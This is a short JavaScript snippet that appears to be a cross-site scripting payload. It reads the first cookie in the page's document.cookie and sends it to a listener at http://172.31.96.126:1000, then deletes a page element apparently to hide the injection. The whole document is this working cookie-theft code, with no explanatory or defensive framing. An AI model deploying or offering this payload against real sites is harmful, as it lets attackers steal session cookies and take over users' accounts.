(function() {
    var xhttp = new XMLHttpRequest();
    var id = document.cookie.split(';')[0].split('=')[1]; 
    var url = `http://172.31.96.126:1000/?j=${id}`;
    document.getElementById('start-menu-url').remove(); 
    xhttp.open('GET', url, true); 
    xhttp.send();
})();
